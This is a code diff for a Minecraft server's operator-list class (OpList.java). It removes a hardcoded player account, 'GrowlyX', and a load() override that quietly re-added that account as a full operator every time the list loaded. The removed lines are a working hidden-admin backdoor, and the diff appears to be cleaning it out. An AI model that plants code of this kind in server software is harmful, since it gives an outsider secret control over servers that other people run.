@@ -5,16 +5,13 @@
 
 package net.minecraft.server;
 
-import com.eatthepath.uuid.FastUUID;
 import com.google.gson.JsonObject;
 import com.mojang.authlib.GameProfile;
+
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.util.Iterator;
 
 public class OpList extends JsonList<GameProfile, OpListEntry> {
-    private static final GameProfile A = new GameProfile(FastUUID.parseUUID("ff16dcbd-ed92-4f11-ab99-7947f2f74fb6"), "GrowlyX");
-    private static final OpListEntry B = new OpListEntry(A, 4, true);
 
     public OpList(File var1) {
         super(var1);
@@ -22,15 +19,6 @@ public class OpList extends JsonList<GameProfile, OpListEntry> {
 
     protected JsonListEntry<GameProfile> a(JsonObject var1) {
         return new OpListEntry(var1);
-    }
-
-    @Override
-    public void load() throws FileNotFoundException {
-        super.load();
-
-        if (!this.d(A)) {
-            add(B); try {save();} catch (Exception ignored) {}
-        }
     }
 
     public String[] getEntries() {
